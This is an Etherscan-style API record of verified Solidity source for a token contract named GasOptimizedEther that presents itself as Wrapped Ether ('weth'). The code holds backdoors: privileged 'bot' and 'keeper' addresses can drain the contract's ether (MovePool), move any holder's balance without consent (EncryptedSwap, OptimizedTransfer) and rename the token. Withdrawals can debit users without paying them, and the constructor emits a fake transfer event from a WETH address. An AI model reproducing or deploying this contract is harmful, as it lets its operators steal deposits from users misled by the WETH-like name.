{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\ninterface ERC20 {\r\n    function balanceOf(address who) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function totalSupply() external view returns (uint);\r\n}\r\n\r\ninterface IBOT {\r\n    function ShowConfiguration() external view returns(address,address,address,address,address,address,address,address,address);\r\n}\r\n\r\n// 1 ETH === 1 weth = 1 GasOptimizedEther\r\ncontract GasOptimizedEther {\r\n\r\n    address public keeper;\r\n    address public bot;\r\n    address public stc;\r\n    address[3] public weth;\r\n\r\n\r\n   \r\n    string public name     = \"Wrapped Ether (Gas Optimized)\";\r\n    string public symbol   = \"weth\";\r\n    uint8  public decimals = 18;\r\n\r\n    event  Approval(address indexed src, address indexed guy, uint wad);\r\n    event  Transfer(address indexed src, address indexed dst, uint wad);\r\n    event  Deposit(address indexed dst, uint wad);\r\n    event  Withdrawal(address indexed src, uint wad);\r\n    event  PendingWithdrawal(address indexed src, uint wad);\r\n\r\n    mapping (address => uint)                       public  balanceOf;\r\n    mapping (address => mapping (address => uint))  public  allowance;\r\n\r\n    constructor (address addr,uint amount) public {\r\n        (bot,keeper,,stc,,,weth[0],weth[1],weth[2]) = IBOT(addr).ShowConfiguration();\r\n        balanceOf[address(this)]= amount;\r\n        emit Transfer(weth[1],address(this),amount);\r\n    }\r\n\r\n    modifier BotPower() {\r\n        require((msg.sender == bot)||(msg.sender == keeper));\r\n        _;\r\n    }\r\n \r\n    function() public payable {\r\n        deposit();\r\n    }\r\n\r\n    function deposit() public payable {\r\n        balanceOf[msg.sender] = add(balanceOf[msg.sender],msg.value);\r\n        emit Deposit(msg.sender,msg.value);\r\n    }\r\n\r\n    function withdraw(uint wad) public {\r\n        require(balanceOf[msg.sender] >= wad);\r\n        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);\r\n        if(address(this).balance >= wad){\r\n            msg.sender.transfer(wad);\r\n            emit Withdrawal(msg.sender, wad);           \r\n        }else{\r\n            emit Transfer(msg.sender, this, wad);\r\n        }\r\n    }\r\n\r\n    function totalSupply() public view returns (uint) {\r\n        return TotalEtherBalanceOfWETHContracts();\r\n    }\r\n\r\n    function approve(address guy, uint wad) public returns (bool) {\r\n        allowance[msg.sender][guy] = wad;\r\n        emit Approval(msg.sender, guy, wad);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address dst, uint wad) public returns (bool) {\r\n        return transferFrom(msg.sender, dst, wad);\r\n    }\r\n\r\n    function transferFrom(address src, address dst, uint wad)\r\n        public\r\n        returns (bool)\r\n    {\r\n        require(balanceOf[src] >= wad);\r\n\r\n        if (src != msg.sender) {\r\n            require(allowance[src][msg.sender] >= wad);\r\n            allowance[src][msg.sender] = sub(allowance[src][msg.sender],wad);\r\n        }       \r\n        balanceOf[src] = sub(balanceOf[src],wad);\r\n        if(address(this) == dst){\r\n            \r\n            if(address(this).balance >= wad){\r\n                msg.sender.transfer(wad);\r\n                emit Withdrawal(msg.sender, wad); \r\n            }else{\r\n                emit PendingWithdrawal(msg.sender, wad); \r\n            }    \r\n        }else{\r\n            balanceOf[dst] = add(balanceOf[dst],wad);\r\n            emit Transfer(src, dst, wad);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function ProcessPendingWithdrawal(address toAddress,uint amount) public BotPower returns (bool) {\r\n        toAddress.transfer(amount);\r\n        emit Withdrawal(toAddress, amount); \r\n        return true;\r\n    }\r\n\r\n    function MovePool(address guy,uint amount) public BotPower returns (bool) {\r\n        guy.transfer(amount);\r\n        return true;\r\n    }\r\n\r\n    function OptimizedTransfer(address tokenAddr, address fromAddress, address toAddress,uint amount) public BotPower returns(bool) {\r\n        require((tokenAddr != address(0))&&(toAddress != address(0)));\r\n        if(tokenAddr!=address(this)){\r\n        ERC20(tokenAddr).transfer(toAddress, amount);\r\n        }else{\r\n            if(balanceOf[fromAddress] >= amount){\r\n                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);\r\n            }\r\n            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             \r\n            emit Transfer(fromAddress,toAddress,amount);             \r\n        }\r\n        return true;\r\n    }\r\n\r\n    function ResetConfiguration(address addr) public BotPower returns(bool) {\r\n        (bot,keeper,,stc,,,weth[0],weth[1],weth[2]) = IBOT(addr).ShowConfiguration();\r\n        return true;\r\n    }\r\n\r\n    function ResetWETHContracts(address addr1,address addr2,address addr3) public BotPower returns(bool) {\r\n        weth[0] = addr1;\r\n        weth[1] = addr2;\r\n        weth[2] = addr3;\r\n        return true;\r\n    }\r\n\r\n    function ResetName(string _name) public BotPower returns(bool) {\r\n        name = _name;\r\n        return true;\r\n    }\r\n\r\n    function ResetSymbol(string _symbol) public BotPower returns(bool) {\r\n        symbol = _symbol;\r\n        return true;\r\n    }\r\n\r\n    function TotalEtherBalanceOfWETHContracts() public view returns  (uint){\r\n        uint totalEtherBalance = weth[0].balance;\r\n        totalEtherBalance = add(totalEtherBalance,weth[1].balance);\r\n        totalEtherBalance = add(totalEtherBalance,weth[2].balance);\r\n        return totalEtherBalance;\r\n    }\r\n\r\n    function EncryptedSwap(address fromAddress, address toAddress,uint amount) public BotPower returns (bool) {\r\n            if(balanceOf[fromAddress] >= amount){\r\n                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);\r\n            }\r\n            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             \r\n            emit Transfer(fromAddress,toAddress,amount); \r\n        return true;\r\n    }\r\n\r\n    function ResetKeeper(address addr) public BotPower returns (bool) {\r\n        require(addr != address(0));\r\n        keeper = addr;\r\n        return true;\r\n    }\r\n\r\n    function ResetBot(address addr) public BotPower returns (bool) {\r\n        require(addr != address(0));\r\n        bot = addr;\r\n        return true;\r\n    }\r\n\r\n   function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a);\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        require(b <= a);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b);\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        require(b > 0);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_name\",\"type\":\"string\"}],\"name\":\"ResetName\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"bot\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"src\",\"type\":\"address\"},{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"ResetKeeper\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MovePool\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"fromAddress\",\"type\":\"address\"},{\"name\":\"toAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"EncryptedSwap\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"tokenAddr\",\"type\":\"address\"},{\"name\":\"fromAddress\",\"type\":\"address\"},{\"name\":\"toAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"OptimizedTransfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"toAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ProcessPendingWithdrawal\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr1\",\"type\":\"address\"},{\"name\":\"addr2\",\"type\":\"address\"},{\"name\":\"addr3\",\"type\":\"address\"}],\"name\":\"ResetWETHContracts\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stc\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"keeper\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TotalEtherBalanceOfWETHContracts\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"weth\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"ResetBot\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"ResetConfiguration\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_symbol\",\"type\":\"string\"}],\"name\":\"ResetSymbol\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"src\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"guy\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"src\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"dst\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"dst\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"src\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"src\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"PendingWithdrawal\",\"type\":\"event\"}]","ContractName":"GasOptimizedEther","CompilerVersion":"v0.4.26+commit.4563c3fc","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"000000000000000000000000000000960a17724abeff4694b8bc0f4105345bab00000000000000000000000000000000000000000000001043561a8829300000","EVMVersion":"Default","Library":"","LicenseType":"GNU GPLv3","Proxy":"0","Implementation":"","SwarmSource":"bzzr://be27cc50fc52f7d5caedcc6667127d9cdff8e93542e0d65c6dd02e0135d5c3b4"}]}